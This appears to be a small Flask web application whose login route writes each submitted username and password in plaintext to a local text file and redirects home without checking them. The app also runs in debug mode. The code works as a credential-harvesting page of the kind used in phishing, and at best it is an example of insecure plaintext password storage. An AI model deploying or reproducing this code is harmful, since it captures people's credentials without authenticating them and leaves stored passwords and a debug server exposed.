
from flask import Flask, request, redirect, url_for, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        with open('login_details.txt', 'a') as f:
            f.write(f'{username},{password}\n')
        
        return redirect(url_for('home'))
    else:
        return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
